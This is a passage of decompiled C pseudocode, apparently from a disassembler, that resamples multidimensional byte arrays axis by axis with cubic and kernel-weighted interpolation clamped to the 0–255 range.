        v385 = _mm_cvtsi32_si128(v381);
        v386 = 0;
        HIDWORD(v702) = 0;
        v755 = (int)(float)((float)(v384 * a12) + _mm_cvtepi32_ps(v385).m128_f32[0]);
        if ( v749 > 0 )
        {
          v387 = v747;
          v388 = pExceptionObject;
          v389 = v749;
          do
          {
            v755 -= v704;
            v390 = v746;
            if ( v755 <= 0 )
            {
              v391 = 0;
              v708 = 0;
              if ( v388 > 0 )
              {
                v392 = pExceptionObject;
                do
                {
                  v393 = 0;
                  if ( v387 > 0 )
                  {
                    do
                    {
                      v394 = 0;
                      if ( v390 > 0 )
                      {
                        do
                        {
                          v395 = *(_BYTE *)sub_422930(&v727, v394, v393, v391, SHIDWORD(v702));
                          v396 = (_BYTE *)sub_422930(&v746, v394, v393, v708, v700);
                          v391 = v708;
                          ++v394;
                          *v396 = v395;
                          v390 = v746;
                        }
                        while ( v394 < v746 );
                        v387 = v747;
                      }
                      ++v393;
                    }
                    while ( v393 < v387 );
                    v392 = pExceptionObject;
                  }
                  v708 = ++v391;
                }
                while ( v391 < v392 );
                v383 = v700;
                v386 = HIDWORD(v702);
                v388 = pExceptionObject;
              }
              ++v386;
              v755 += HIDWORD(v699);
              v389 = v749;
              HIDWORD(v702) = v386;
            }
            v700 = ++v383;
          }
          while ( v383 < v389 );
          v12 = (int *)v703;
        }
        sub_424010((void **)&v727);
      }
      else
      {
        v380 = sub_424050(v690, v735, v734, v733, v726, 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 47;
        sub_423F60(v380, (int)&v746);
        LOBYTE(v756) = 43;
        sub_421DE0(v690);
        sub_424010((void **)&v727);
      }
      if ( LOBYTE(v750) )
      {
        if ( v731 )
        {
          if ( v745 )
          {
            if ( v740 )
            {
              v397 = sub_423F40(v12, v709);
              LOBYTE(v756) = 48;
              v398 = 512;
            }
            else
            {
              v397 = sub_422960(v711, (int)&v736);
              v756 = 49;
              v398 = 1024;
            }
            v701 = v398;
            v399 = sub_422960(v687, (int)v397);
            v756 = 50;
            v400 = v398 | 0x800;
          }
          else
          {
            v399 = sub_422960(v686, (int)&v741);
            v756 = 51;
            v400 = 4096;
          }
          v701 = v400;
          v401 = sub_422960(v685, (int)v399);
          v756 = 52;
          v402 = v400 | 0x2000;
        }
        else
        {
          v401 = sub_422960(v684, (int)&v727);
          v756 = 53;
          v402 = 0x4000;
        }
        v701 = v402;
        v403 = sub_422960(v683, (int)v401);
        v756 = 54;
        v404 = v402 | 0x8000;
      }
      else
      {
        v403 = sub_422960(v690, (int)&v746);
        v756 = 55;
        v404 = 0x10000;
      }
      v405 = v691;
      v701 = v404;
      sub_422960(v691, (int)v403);
      v406 = v404 | 1;
      if ( (v406 & 0x10000) != 0 )
        sub_421DE0(v690);
      if ( (v406 & 0x8000) != 0 )
      {
        LOWORD(v406) = v406 & 0x7FFF;
        sub_421DE0(v683);
      }
      if ( (v406 & 0x4000) != 0 )
      {
        LOWORD(v406) = v406 & 0xBFFF;
        sub_421DE0(v684);
      }
      if ( (v406 & 0x2000) != 0 )
      {
        LOWORD(v406) = v406 & 0xDFFF;
        sub_421DE0(v685);
      }
      if ( (v406 & 0x1000) != 0 )
      {
        LOWORD(v406) = v406 & 0xEFFF;
        sub_421DE0(v686);
      }
      if ( (v406 & 0x800) != 0 )
      {
        LOWORD(v406) = v406 & 0xF7FF;
        sub_421DE0(v687);
      }
      if ( (v406 & 0x400) != 0 )
      {
        LOWORD(v406) = v406 & 0xFBFF;
        sub_421DE0(v711);
      }
      if ( (v406 & 0x200) != 0 )
        sub_421DE0(v709);
      sub_421DE0((void **)&v746);
      sub_421DE0((void **)&v727);
      sub_421DE0((void **)&v741);
      sub_421DE0((void **)&v736);
      sub_421DE0((void **)&v714);
      return v405;
    case 5:
      v407 = sub_42BBC0(&v735, &v734, &v733, &v726);
      sub_421DF0(v709, v407, 1, 1, 1);
      LOBYTE(v756) = 56;
      sub_423900(v711, (unsigned int)v709[0], 1, 1, 1);
      LOBYTE(v756) = 57;
      sub_4223B0(&v736);
      LOBYTE(v756) = 58;
      sub_4223B0(&v741);
      LOBYTE(v756) = 59;
      sub_4223B0(&v727);
      LOBYTE(v756) = 60;
      sub_4223B0(&v720);
      v408 = a8;
      LOBYTE(v756) = 61;
      v409 = *v12;
      if ( v735 == *v12 )
      {
        sub_42BCD0((int)&v736, v12, 1);
        goto LABEL_655;
      }
      if ( v409 == 1 )
      {
        v410 = sub_424050(v690, v735, v12[1], v12[2], v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 62;
LABEL_622:
        sub_423F60(v410, (int)&v736);
        LOBYTE(v756) = 61;
        sub_421DE0(v690);
        goto LABEL_655;
      }
      if ( v409 > v735 )
      {
        v410 = sub_424050(v690, v735, v12[1], v12[2], v12[3], 2, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 63;
        goto LABEL_622;
      }
      if ( a8 || v735 <= v409 )
      {
        v413 = _mm_cvtsi32_si128(v735);
        v414 = (double)v409;
        v412 = v735;
      }
      else
      {
        if ( v735 <= 1 )
        {
          v699 = 0.0;
          goto LABEL_630;
        }
        v411 = (double)v409;
        v412 = v735 - 1;
        v413 = _mm_cvtsi32_si128(v735 - 1);
        v414 = v411 - 1.0;
      }
      v699 = v414 / (_mm_cvtepi32_pd(v413).m128d_f64[0] + *(double *)&qword_4EA220[v412 >> 31]);
LABEL_630:
      sub_42A620((int)&v736, v735, v12[1], v12[2], v12[3]);
      v415 = 0.0;
      v416 = (_DWORD *)v710;
      v417 = (double *)Block;
      Size = 0;
      if ( v736 > 0 )
      {
        v418 = 0;
        do
        {
          v419 = v418;
          v750 = v415 + v699;
          *v417 = v415 - (double)v418;
          v704 = (unsigned int)(v417 + 1);
          v753 = (double)sub_409B40(v12) - 1.0;
          v750 = *sub_42BBB0(&v753, &v750);
          v418 = (unsigned int)v750;
          v415 = v750;
          *v416++ = (unsigned int)v750 - v419;
          v223 = (int)++Size < v736;
          v417 = (double *)v704;
        }
        while ( v223 );
      }
      v420 = v739;
      v421 = 0;
      v705 = 0;
      if ( v739 > 0 )
      {
        v422 = v738;
        v423 = v737;
        do
        {
          v424 = 0;
          v708 = 0;
          if ( v422 > 0 )
          {
            do
            {
              v425 = 0;
              HIDWORD(v753) = 0;
              if ( v423 > 0 )
              {
                do
                {
                  v426 = sub_422930(v12, 0, v425, v424, v705);
                  v427 = *v12;
                  v428 = (unsigned __int8 *)v426;
                  v704 = v426;
                  Size = v427 - 2 + v426;
                  v429 = sub_422930(&v736, 0, v425, v708, v705);
                  v430 = (int *)v710;
                  v431 = 0;
                  v432 = (_BYTE *)v429;
                  v433 = (double *)Block;
                  if ( v736 > 0 )
                  {
                    while ( 1 )
                    {
                      ++v433;
                      v435 = (unsigned int)v428 <= v704 ? (double)*v428 : (double)*(v428 - 1);
                      if ( (unsigned int)v428 > Size )
                        break;
                      v436 = (double)v428[1];
                      if ( (unsigned int)v428 >= Size )
                        goto LABEL_645;
                      v437 = (double)v428[2];
LABEL_646:
                      v438 = 0.0;
                      v434 = *(v433 - 1);
                      v439 = ((v435 + v435 - (double)*v428 * 5.0 + v436 * 4.0 - v437) * (v434 * v434)
                            + (v436 - v435) * v434
                            + ((double)*v428 * 3.0 - v435 - v436 * 3.0 + v437) * (v434 * (v434 * v434)))
                           * 0.5
                           + (double)*v428;
                      if ( v439 >= 0.0 )
                        v438 = fmin(255.0, v439);
                      ++v431;
                      *v432++ = (int)v438;
                      v440 = *v430++;
                      v428 += v440;
                      if ( v431 >= v736 )
                        goto LABEL_649;
                    }
                    v436 = (double)*v428;
LABEL_645:
                    v437 = v436;
                    goto LABEL_646;
                  }
LABEL_649:
                  v423 = v737;
                  v425 = HIDWORD(v753) + 1;
                  v12 = (int *)v703;
                  v424 = v708;
                  HIDWORD(v753) = v425;
                }
                while ( v425 < v737 );
                v422 = v738;
              }
              v708 = ++v424;
            }
            while ( v424 < v422 );
            v420 = v739;
            v421 = v705;
          }
          v705 = ++v421;
        }
        while ( v421 < v420 );
      }
      v408 = a8;
LABEL_655:
      v441 = v12[1];
      if ( v734 != v441 )
      {
        if ( v441 == 1 )
        {
          v442 = sub_424050(v690, v735, v734, v12[2], v12[3], 1, 0, 0, 0, 0, 0);
          LOBYTE(v756) = 64;
LABEL_661:
          sub_423F60(v442, (int)&v741);
          LOBYTE(v756) = 61;
          sub_421DE0(v690);
          sub_424010((void **)&v736);
          goto LABEL_696;
        }
        if ( v441 > v734 )
        {
          v442 = sub_424050(v690, v735, v734, v12[2], v12[3], 2, 0, 0, 0, 0, 0);
          LOBYTE(v756) = 65;
          goto LABEL_661;
        }
        if ( v408 || v734 <= v441 )
        {
          v445 = _mm_cvtsi32_si128(v734);
          v446 = (double)v441;
          v444 = v734;
        }
        else
        {
          if ( v734 <= 1 )
          {
            v699 = 0.0;
LABEL_669:
            sub_42A620((int)&v741, v735, v734, v12[2], v12[3]);
            v447 = 0.0;
            v448 = (_DWORD *)v710;
            v449 = (double *)Block;
            Size = 0;
            if ( v742 > 0 )
            {
              v450 = 0;
              do
              {
                v451 = v450;
                *v449 = v447 - (double)v450;
                v704 = (unsigned int)(v449 + 1);
                v750 = v699 + v447;
                v753 = (double)sub_422EF0(v12) - 1.0;
                v750 = *sub_42BBB0(&v753, &v750);
                v450 = (unsigned int)v750;
                v447 = v750;
                *v448++ = v735 * ((unsigned int)v750 - v451);
                v223 = (int)++Size < v742;
                v449 = (double *)v704;
              }
              while ( v223 );
            }
            v452 = v744;
            v453 = 0;
            v705 = 0;
            if ( v744 <= 0 )
              goto LABEL_694;
            v454 = v743;
            v455 = v741;
            while ( 1 )
            {
              v456 = 0;
              v708 = 0;
              if ( v454 <= 0 )
                goto LABEL_693;
              do
              {
                v457 = 0;
                HIDWORD(v702) = 0;
                if ( v455 <= 0 )
                  goto LABEL_691;
                do
                {
                  v458 = sub_422930(&v736, v457, 0, v456, v453);
                  v459 = v12[1];
                  v704 = v458;
                  v460 = (unsigned __int8 *)v458;
                  v461 = v458 + v735 * (v459 - 2);
                  v462 = (_BYTE *)sub_422930(&v741, SHIDWORD(v702), 0, v708, v705);
                  v463 = (int *)v710;
                  v464 = (double *)Block;
                  Size = 0;
                  if ( v742 > 0 )
                  {
                    v465 = v735;
                    while ( 1 )
                    {
                      v466 = *v464;
                      HIDWORD(v699) = v464 + 1;
                      v467 = (unsigned int)v460 <= v704 ? (double)*v460 : (double)v460[-v465];
                      if ( (unsigned int)v460 > v461 )
                        break;
                      v468 = (double)v460[v465];
                      if ( (unsigned int)v460 >= v461 )
                        goto LABEL_685;
                      v469 = (double)v460[2 * v465];
LABEL_686:
                      v470 = 0.0;
                      v471 = ((v467 + v467 - (double)*v460 * 5.0 + v468 * 4.0 - v469) * (v466 * v466)
                            + (v468 - v467) * v466
                            + ((double)*v460 * 3.0 - v467 - v468 * 3.0 + v469) * (v466 * (v466 * v466)))
                           * 0.5
                           + (double)*v460;
                      if ( v471 >= 0.0 )
                        v470 = fmin(255.0, v471);
                      *v462 = (int)v470;
                      v472 = *v463++;
                      v465 = v735;
                      v460 += v472;
                      v462 += v735;
                      v223 = (int)++Size < v742;
                      v464 = (double *)HIDWORD(v699);
                      if ( !v223 )
                        goto LABEL_689;
                    }
                    v468 = (double)*v460;
LABEL_685:
                    v469 = v468;
                    goto LABEL_686;
                  }
LABEL_689:
                  v455 = v741;
                  v457 = HIDWORD(v702) + 1;
                  v12 = (int *)v703;
                  v456 = v708;
                  v453 = v705;
                  HIDWORD(v702) = v457;
                }
                while ( v457 < v741 );
                v454 = v743;
LABEL_691:
                v708 = ++v456;
              }
              while ( v456 < v454 );
              v452 = v744;
LABEL_693:
              v705 = ++v453;
              if ( v453 >= v452 )
              {
LABEL_694:
                sub_424010((void **)&v736);
                goto LABEL_696;
              }
            }
          }
          v443 = (double)v441;
          v444 = v734 - 1;
          v445 = _mm_cvtsi32_si128(v734 - 1);
          v446 = v443 - 1.0;
        }
        v699 = v446 / (_mm_cvtepi32_pd(v445).m128d_f64[0] + *(double *)&qword_4EA220[v444 >> 31]);
        goto LABEL_669;
      }
      sub_42BCD0((int)&v741, &v736, 1);
LABEL_696:
      v473 = v12[2];
      if ( v733 == v473 )
      {
        sub_42BCD0((int)&v727, &v741, 1);
        goto LABEL_735;
      }
      if ( v473 == 1 )
      {
        v474 = sub_424050(v690, v735, v734, v733, v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 66;
LABEL_701:
        sub_423F60(v474, (int)&v727);
        LOBYTE(v756) = 61;
        sub_421DE0(v690);
        sub_424010((void **)&v741);
        goto LABEL_735;
      }
      if ( v473 > v733 )
      {
        v474 = sub_424050(v690, v735, v734, v733, v12[3], 2, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 67;
        goto LABEL_701;
      }
      if ( a8 || v733 <= v473 )
      {
        v477 = _mm_cvtsi32_si128(v733);
        v478 = (double)v473;
        v476 = v733;
      }
      else
      {
        if ( v733 <= 1 )
        {
          v699 = 0.0;
LABEL_709:
          v479 = v735 * v734;
          sub_42A620((int)&v727, v735, v734, v733, v12[3]);
          v480 = 0.0;
          v481 = (double *)Block;
          Size = v710;
          HIDWORD(v753) = 0;
          if ( v729 > 0 )
          {
            v482 = 0;
            do
            {
              v483 = v482;
              *v481 = v480 - (double)v482;
              v704 = (unsigned int)(v481 + 1);
              v750 = v699 + v480;
              v752 = (double)sub_42A5B0(v12) - 1.0;
              v750 = *sub_42BBB0(&v752, &v750);
              v482 = (unsigned int)v750;
              v484 = Size;
              v480 = v750;
              *(_DWORD *)Size = v479 * ((unsigned int)v750 - v483);
              Size = v484 + 4;
              v223 = ++HIDWORD(v753) < v729;
              v481 = (double *)v704;
            }
            while ( v223 );
          }
          v485 = v730;
          v705 = 0;
          if ( v730 > 0 )
          {
            v486 = v728;
            v487 = v727;
            do
            {
              v488 = 0;
              v708 = 0;
              if ( v486 > 0 )
              {
                do
                {
                  v489 = 0;
                  HIDWORD(v702) = 0;
                  if ( v487 > 0 )
                  {
                    do
                    {
                      v490 = sub_422930(&v741, v489, v488, 0, v705);
                      v491 = v12[2];
                      v704 = v490;
                      v492 = (unsigned __int8 *)v490;
                      v493 = v490 + v479 * (v491 - 2);
                      v494 = (_BYTE *)sub_422930(&v727, SHIDWORD(v702), v708, 0, v705);
                      v495 = (_DWORD *)v710;
                      v496 = (double *)Block;
                      Size = 0;
                      if ( v729 > 0 )
                      {
                        while ( 1 )
                        {
                          v497 = *v496;
                          HIDWORD(v699) = v496 + 1;
                          v498 = (unsigned int)v492 <= v704 ? (double)*v492 : (double)v492[-v479];
                          if ( (unsigned int)v492 > v493 )
                            break;
                          v499 = (double)v492[v479];
                          if ( (unsigned int)v492 >= v493 )
                            goto LABEL_724;
                          v500 = (double)v492[2 * v479];
LABEL_725:
                          v501 = 0.0;
                          v502 = ((v498 + v498 - (double)*v492 * 5.0 + v499 * 4.0 - v500) * (v497 * v497)
                                + (v499 - v498) * v497
                                + ((double)*v492 * 3.0 - v498 - v499 * 3.0 + v500) * (v497 * (v497 * v497)))
                               * 0.5
                               + (double)*v492;
                          if ( v502 >= 0.0 )
                            v501 = fmin(255.0, v502);
                          *v494 = (int)v501;
                          v494 += v479;
                          v492 += *v495++;
                          v223 = (int)++Size < v729;
                          v496 = (double *)HIDWORD(v699);
                          if ( !v223 )
                            goto LABEL_728;
                        }
                        v499 = (double)*v492;
LABEL_724:
                        v500 = v499;
                        goto LABEL_725;
                      }
LABEL_728:
                      v487 = v727;
                      v489 = HIDWORD(v702) + 1;
                      v12 = (int *)v703;
                      v488 = v708;
                      HIDWORD(v702) = v489;
                    }
                    while ( v489 < v727 );
                    v486 = v728;
                  }
                  v708 = ++v488;
                }
                while ( v488 < v486 );
                v485 = v730;
              }
              ++v705;
            }
            while ( v705 < v485 );
          }
          sub_424010((void **)&v741);
LABEL_735:
          v503 = v12[3];
          if ( v726 == v503 )
          {
            sub_42BCD0((int)&v720, &v727, 1);
            goto LABEL_774;
          }
          if ( v503 == 1 )
          {
            v504 = sub_424050(v690, v735, v734, v733, v726, 1, 0, 0, 0, 0, 0);
            LOBYTE(v756) = 68;
LABEL_740:
            sub_423F60(v504, (int)&v720);
            LOBYTE(v756) = 61;
            sub_421DE0(v690);
            sub_424010((void **)&v727);
LABEL_774:
            if ( v724 )
            {
              if ( v731 )
              {
                if ( v745 )
                {
                  if ( v740 )
                  {
                    v533 = sub_423F40(v12, &v746);
                    LOBYTE(v756) = 70;
                    v534 = 0x20000;
                  }
                  else
                  {
                    v533 = sub_422960(v697, (int)&v736);
                    v756 = 71;
                    v534 = 0x40000;
                  }
                  v701 = v534;
                  v535 = sub_422960(v687, (int)v533);
                  v756 = 72;
                  v536 = v534 | 0x80000;
                }
                else
                {
                  v535 = sub_422960(v686, (int)&v741);
                  v756 = 73;
                  v536 = 0x100000;
                }
                v701 = v536;
                v537 = sub_422960(v685, (int)v535);
                v756 = 74;
                v538 = v536 | 0x200000;
              }
              else
              {
                v537 = sub_422960(v684, (int)&v727);
                v756 = 75;
                v538 = 0x400000;
              }
              v701 = v538;
              v539 = sub_422960(v683, (int)v537);
              v756 = 76;
              v540 = v538 | 0x800000;
            }
            else
            {
              v539 = sub_422960(v690, (int)&v720);
              v756 = 77;
              v540 = 0x1000000;
            }
            v328 = v691;
            v701 = v540;
            sub_422960(v691, (int)v539);
            v541 = v540 | 1;
            if ( (v541 & 0x1000000) != 0 )
            {
              v541 &= ~0x1000000u;
              sub_421DE0(v690);
            }
            if ( (v541 & 0x800000) != 0 )
            {
              v541 &= ~0x800000u;
              sub_421DE0(v683);
            }
            if ( (v541 & 0x400000) != 0 )
            {
              v541 &= ~0x400000u;
              sub_421DE0(v684);
            }
            if ( (v541 & 0x200000) != 0 )
            {
              v541 &= ~0x200000u;
              sub_421DE0(v685);
            }
            if ( (v541 & 0x100000) != 0 )
            {
              v541 &= ~0x100000u;
              sub_421DE0(v686);
            }
            if ( (v541 & 0x80000) != 0 )
            {
              v541 &= ~0x80000u;
              sub_421DE0(v687);
            }
            if ( (v541 & 0x40000) != 0 )
            {
              v541 &= ~0x40000u;
              sub_421DE0(v697);
            }
            v542 = (v541 & 0x20000) == 0;
            goto LABEL_801;
          }
          if ( v503 > v726 )
          {
            v504 = sub_424050(v690, v735, v734, v733, v726, 2, 0, 0, 0, 0, 0);
            LOBYTE(v756) = 69;
            goto LABEL_740;
          }
          if ( a8 || v726 <= v503 )
          {
            v507 = _mm_cvtsi32_si128(v726);
            v508 = (double)v503;
            v506 = v726;
          }
          else
          {
            if ( v726 <= 1 )
            {
              v699 = 0.0;
              goto LABEL_748;
            }
            v505 = (double)v503;
            v506 = v726 - 1;
            v507 = _mm_cvtsi32_si128(v726 - 1);
            v508 = v505 - 1.0;
          }
          v699 = v508 / (_mm_cvtepi32_pd(v507).m128d_f64[0] + *(double *)&qword_4EA220[v506 >> 31]);
LABEL_748:
          v509 = v735 * v734 * v733;
          sub_42A620((int)&v720, v735, v734, v733, v726);
          v510 = 0.0;
          v511 = (double *)Block;
          Size = v710;
          HIDWORD(v753) = 0;
          if ( v723 > 0 )
          {
            v512 = 0;
            do
            {
              v513 = v512;
              *v511 = v510 - (double)v512;
              v704 = (unsigned int)(v511 + 1);
              v750 = v699 + v510;
              v752 = (double)sub_41C280(v12) - 1.0;
              v750 = *sub_42BBB0(&v752, &v750);
              v512 = (unsigned int)v750;
              v514 = Size;
              v510 = v750;
              *(_DWORD *)Size = v509 * ((unsigned int)v750 - v513);
              Size = v514 + 4;
              v223 = ++HIDWORD(v753) < v723;
              v511 = (double *)v704;
            }
            while ( v223 );
          }
          v515 = v722;
          v705 = 0;
          if ( v722 > 0 )
          {
            v516 = v721;
            v517 = v720;
            do
            {
              v518 = 0;
              v708 = 0;
              if ( v516 > 0 )
              {
                do
                {
                  v519 = 0;
                  HIDWORD(v702) = 0;
                  if ( v517 > 0 )
                  {
                    do
                    {
                      v520 = sub_422930(&v727, v519, v518, v705, 0);
                      v521 = v12[3];
                      v704 = v520;
                      v522 = (unsigned __int8 *)v520;
                      v523 = v520 + v509 * (v521 - 2);
                      v524 = (_BYTE *)sub_422930(&v720, SHIDWORD(v702), v708, v705, 0);
                      v525 = (_DWORD *)v710;
                      v526 = (double *)Block;
                      Size = 0;
                      if ( v723 > 0 )
                      {
                        while ( 1 )
                        {
                          v527 = *v526;
                          HIDWORD(v699) = v526 + 1;
                          v528 = (unsigned int)v522 <= v704 ? (double)*v522 : (double)v522[-v509];
                          if ( (unsigned int)v522 > v523 )
                            break;
                          v529 = (double)v522[v509];
                          if ( (unsigned int)v522 >= v523 )
                            goto LABEL_763;
                          v530 = (double)v522[2 * v509];
LABEL_764:
                          v531 = 0.0;
                          v532 = ((v528 + v528 - (double)*v522 * 5.0 + v529 * 4.0 - v530) * (v527 * v527)
                                + (v529 - v528) * v527
                                + ((double)*v522 * 3.0 - v528 - v529 * 3.0 + v530) * (v527 * (v527 * v527)))
                               * 0.5
                               + (double)*v522;
                          if ( v532 >= 0.0 )
                            v531 = fmin(255.0, v532);
                          *v524 = (int)v531;
                          v524 += v509;
                          v522 += *v525++;
                          v223 = (int)++Size < v723;
                          v526 = (double *)HIDWORD(v699);
                          if ( !v223 )
                            goto LABEL_767;
                        }
                        v529 = (double)*v522;
LABEL_763:
                        v530 = v529;
                        goto LABEL_764;
                      }
LABEL_767:
                      v517 = v720;
                      v519 = HIDWORD(v702) + 1;
                      v12 = (int *)v703;
                      v518 = v708;
                      HIDWORD(v702) = v519;
                    }
                    while ( v519 < v720 );
                    v516 = v721;
                  }
                  v708 = ++v518;
                }
                while ( v518 < v516 );
                v515 = v722;
              }
              ++v705;
            }
            while ( v705 < v515 );
          }
          sub_424010((void **)&v727);
          goto LABEL_774;
        }
        v475 = (double)v473;
        v476 = v733 - 1;
        v477 = _mm_cvtsi32_si128(v733 - 1);
        v478 = v475 - 1.0;
      }
      v699 = v478 / (_mm_cvtepi32_pd(v477).m128d_f64[0] + *(double *)&qword_4EA220[v476 >> 31]);
      goto LABEL_709;
    case 6:
      v543 = sub_42BBC0(&v735, &v734, &v733, &v726);
      sub_421DF0(v709, v543, 1, 1, 1);
      LOBYTE(v756) = 78;
      sub_423900(v711, (unsigned int)v709[0], 1, 1, 1);
      LOBYTE(v756) = 79;
      sub_4223B0(&v736);
      LOBYTE(v756) = 80;
      sub_4223B0(&v741);
      LOBYTE(v756) = 81;
      sub_4223B0(&v727);
      LOBYTE(v756) = 82;
      sub_4223B0(&v720);
      v544 = a8;
      LOBYTE(v756) = 83;
      v545 = *v12;
      if ( v735 == *v12 )
      {
        sub_42BCD0((int)&v736, v12, 1);
        goto LABEL_844;
      }
      if ( v545 == 1 )
      {
        v546 = sub_424050(v690, v735, v12[1], v12[2], v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 84;
LABEL_809:
        sub_423F60(v546, (int)&v736);
        LOBYTE(v756) = 83;
        sub_421DE0(v690);
        goto LABEL_844;
      }
      if ( v545 > v735 )
      {
        v546 = sub_424050(v690, v735, v12[1], v12[2], v12[3], 2, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 85;
        goto LABEL_809;
      }
      if ( a8 || v735 <= v545 )
      {
        v549 = _mm_cvtsi32_si128(v735);
        v550 = (double)v545;
        v548 = v735;
      }
      else
      {
        if ( v735 <= 1 )
        {
          v699 = 0.0;
          goto LABEL_817;
        }
        v547 = (double)v545;
        v548 = v735 - 1;
        v549 = _mm_cvtsi32_si128(v735 - 1);
        v550 = v547 - 1.0;
      }
      v699 = v550 / (_mm_cvtepi32_pd(v549).m128d_f64[0] + *(double *)&qword_4EA220[v548 >> 31]);
LABEL_817:
      sub_42A620((int)&v736, v735, v12[1], v12[2], v12[3]);
      v551 = 0.0;
      v552 = (_DWORD *)v710;
      v553 = (double *)Block;
      Size = 0;
      if ( v736 > 0 )
      {
        v554 = 0;
        do
        {
          v555 = v554;
          v750 = v551 + v699;
          *v553 = v551 - (double)v554;
          v704 = (unsigned int)(v553 + 1);
          v753 = (double)sub_409B40(v12) - 1.0;
          v750 = *sub_42BBB0(&v753, &v750);
          v554 = (unsigned int)v750;
          v551 = v750;
          *v552++ = (unsigned int)v750 - v555;
          v223 = (int)++Size < v736;
          v553 = (double *)v704;
        }
        while ( v223 );
      }
      v556 = v739;
      v557 = 0;
      v705 = 0;
      if ( v739 > 0 )
      {
        v558 = v738;
        v559 = v737;
        do
        {
          v560 = 0;
          v708 = 0;
          if ( v558 > 0 )
          {
            do
            {
              v561 = 0;
              HIDWORD(v753) = 0;
              if ( v559 > 0 )
              {
                do
                {
                  v562 = (unsigned __int8 *)sub_422930(v12, 0, v561, v560, v705);
                  v704 = (unsigned int)(v562 + 1);
                  HIDWORD(v699) = &v562[*v12 - 2];
                  v563 = (_BYTE *)sub_422930(&v736, 0, v561, v708, v705);
                  v564 = (_DWORD *)v710;
                  v565 = (double *)Block;
                  Size = 0;
                  if ( v736 > 0 )
                  {
                    do
                    {
                      v752 = *v565;
                      HIDWORD(v750) = v565 + 1;
                      v693 = COERCE_FLOAT(sub_42B180(v752 + 2.0));
                      v702 = COERCE_FLOAT(sub_42B180(v752 + 1.0));
                      v692 = COERCE_FLOAT(sub_42B180(v752));
                      v694 = COERCE_FLOAT(sub_42B180(v752 - 1.0));
                      v566 = COERCE_FLOAT(sub_42B180(v752 - 2.0));
                      if ( (unsigned int)v562 < v704 )
                      {
                        v567 = (double)*v562;
                      }
                      else
                      {
                        v567 = (double)*(v562 - 1);
                        if ( (unsigned int)v562 > v704 )
                        {
                          v568 = (double)*(v562 - 2);
                          goto LABEL_830;
                        }
                      }
                      v568 = v567;
LABEL_830:
                      if ( (unsigned int)v562 > HIDWORD(v699) )
                      {
                        v569 = (double)*v562;
LABEL_834:
                        v570 = v569;
                        goto LABEL_835;
                      }
                      v569 = (double)v562[1];
                      if ( (unsigned int)v562 >= HIDWORD(v699) )
                        goto LABEL_834;
                      v570 = (double)v562[2];
LABEL_835:
                      v571 = v567 * v702 + v568 * v693 + (double)*v562 * v692 + v569 * v694;
                      v572 = 0.0;
                      v573 = (v571 + v570 * v566) / (v692 + v702 + v694 + v566);
                      if ( v573 >= 0.0 )
                        v572 = fmin(255.0, v573);
                      *v563++ = (int)v572;
                      v562 += *v564++;
                      v223 = (int)++Size < v736;
                      v565 = (double *)HIDWORD(v750);
                    }
                    while ( v223 );
                  }
                  v559 = v737;
                  v561 = HIDWORD(v753) + 1;
                  v12 = (int *)v703;
                  v560 = v708;
                  HIDWORD(v753) = v561;
                }
                while ( v561 < v737 );
                v558 = v738;
              }
              v708 = ++v560;
            }
            while ( v560 < v558 );
            v556 = v739;
            v557 = v705;
          }
          v705 = ++v557;
        }
        while ( v557 < v556 );
      }
      v544 = a8;
LABEL_844:
      v574 = v12[1];
      if ( v734 == v574 )
      {
        sub_42BCD0((int)&v741, &v736, 1);
        goto LABEL_886;
      }
      if ( v574 == 1 )
      {
        v575 = sub_424050(v690, v735, v734, v12[2], v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 86;
LABEL_850:
        sub_423F60(v575, (int)&v741);
        LOBYTE(v756) = 83;
        sub_421DE0(v690);
        sub_424010((void **)&v736);
        goto LABEL_886;
      }
      if ( v574 > v734 )
      {
        v575 = sub_424050(v690, v735, v734, v12[2], v12[3], 2, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 87;
        goto LABEL_850;
      }
      if ( v544 || v734 <= v574 )
      {
        v578 = _mm_cvtsi32_si128(v734);
        v579 = (double)v574;
        v577 = v734;
      }
      else
      {
        if ( v734 <= 1 )
        {
          v699 = 0.0;
          goto LABEL_858;
        }
        v576 = (double)v574;
        v577 = v734 - 1;
        v578 = _mm_cvtsi32_si128(v734 - 1);
        v579 = v576 - 1.0;
      }
      v699 = v579 / (_mm_cvtepi32_pd(v578).m128d_f64[0] + *(double *)&qword_4EA220[v577 >> 31]);
LABEL_858:
      sub_42A620((int)&v741, v735, v734, v12[2], v12[3]);
      v580 = 0.0;
      v581 = (_DWORD *)v710;
      v582 = (double *)Block;
      Size = 0;
      if ( v742 > 0 )
      {
        v583 = 0;
        do
        {
          v584 = v583;
          *v582 = v580 - (double)v583;
          v704 = (unsigned int)(v582 + 1);
          v750 = v699 + v580;
          v753 = (double)sub_422EF0(v12) - 1.0;
          v750 = *sub_42BBB0(&v753, &v750);
          v583 = (unsigned int)v750;
          v580 = v750;
          *v581++ = v735 * ((unsigned int)v750 - v584);
          v223 = (int)++Size < v742;
          v582 = (double *)v704;
        }
        while ( v223 );
      }
      v585 = v744;
      v586 = 0;
      v705 = 0;
      if ( v744 > 0 )
      {
        v587 = v743;
        v588 = v741;
        do
        {
          v589 = 0;
          v708 = 0;
          if ( v587 > 0 )
          {
            do
            {
              v590 = 0;
              HIDWORD(v702) = 0;
              if ( v588 > 0 )
              {
                do
                {
                  v591 = (unsigned __int8 *)sub_422930(&v736, v590, 0, v589, v586);
                  v592 = v12[1] - 2;
                  v704 = (unsigned int)&v591[v735];
                  v593 = &v591[v735 * v592];
                  v594 = (_BYTE *)sub_422930(&v741, SHIDWORD(v702), 0, v708, v705);
                  Size = v710;
                  v595 = (double *)Block;
                  HIDWORD(v753) = 0;
                  if ( v742 > 0 )
                  {
                    do
                    {
                      v750 = *v595;
                      HIDWORD(v699) = v595 + 1;
                      v752 = COERCE_FLOAT(sub_42B180(v750 + 2.0));
                      v693 = COERCE_FLOAT(sub_42B180(v750 + 1.0));
                      v692 = COERCE_FLOAT(sub_42B180(v750));
                      v694 = COERCE_FLOAT(sub_42B180(v750 - 1.0));
                      v596 = COERCE_FLOAT(sub_42B180(v750 - 2.0));
                      if ( (unsigned int)v591 < v704 )
